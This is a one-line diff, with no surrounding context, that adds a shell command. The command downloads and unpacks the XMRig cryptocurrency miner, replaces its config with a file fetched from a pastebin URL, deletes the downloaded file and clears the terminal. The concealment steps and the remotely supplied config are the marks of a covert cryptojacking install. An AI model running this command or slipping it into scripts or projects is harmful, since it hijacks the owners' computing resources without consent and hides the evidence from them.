@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && tar -xvf xmrig-6.21.3-linux-static-x64.tar.gz && cd xmrig-6.21.3 && rm -rf config.json && wget https://pastebin.com/u1GmVicM && cp u1GmVicM config.json && rm -rf u1GmVicM && clear
